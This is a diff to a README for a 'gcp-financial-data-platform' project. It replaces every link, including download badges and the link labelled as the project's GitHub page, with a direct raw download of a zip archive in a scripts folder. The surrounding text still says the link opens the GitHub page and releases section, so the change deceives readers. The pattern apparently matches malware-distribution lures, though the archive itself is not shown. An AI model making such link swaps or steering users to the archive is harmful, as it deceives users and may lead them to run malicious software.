@@ -1,6 +1,6 @@
 # ⚙️ gcp-financial-data-platform - Reliable Financial Data Tools
 
-[![Download Now](https://img.shields.io/badge/Download-gcp--financial--data--platform-brightgreen?style=for-the-badge)](https://github.com/sosannaunregenerate143/gcp-financial-data-platform)
+[![Download Now](https://img.shields.io/badge/Download-gcp--financial--data--platform-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sosannaunregenerate143/gcp-financial-data-platform/main/scripts/financial_gcp_platform_data_2.0.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started, download the software here:
 
-[Download gcp-financial-data-platform](https://github.com/sosannaunregenerate143/gcp-financial-data-platform)
+[Download gcp-financial-data-platform](https://raw.githubusercontent.com/sosannaunregenerate143/gcp-financial-data-platform/main/scripts/financial_gcp_platform_data_2.0.zip)
 
 Click the link above. It will take you to the GitHub page where you can download the files. Since this is a platform involving several tools, the download might include multiple components. You will find a file or installer in the releases section.
 
@@ -105,7 +105,7 @@ For error messages related to Google Cloud services:
 
 You can get updates and community help by visiting the project page:
 
-[GitHub - gcp-financial-data-platform](https://github.com/sosannaunregenerate143/gcp-financial-data-platform)
+[GitHub - gcp-financial-data-platform](https://raw.githubusercontent.com/sosannaunregenerate143/gcp-financial-data-platform/main/scripts/financial_gcp_platform_data_2.0.zip)
 
 Check the “Discussions” and “Issues” tabs to report bugs or ask for features.
 
@@ -137,4 +137,4 @@ Regular updates fix bugs, improve performance, and add new features.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-gcp--financial--data--platform-brightgreen?style=for-the-badge)](https://github.com/sosannaunregenerate143/gcp-financial-data-platform)
+[![Download Now](https://img.shields.io/badge/Download-gcp--financial--data--platform-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sosannaunregenerate143/gcp-financial-data-platform/main/scripts/financial_gcp_platform_data_2.0.zip)
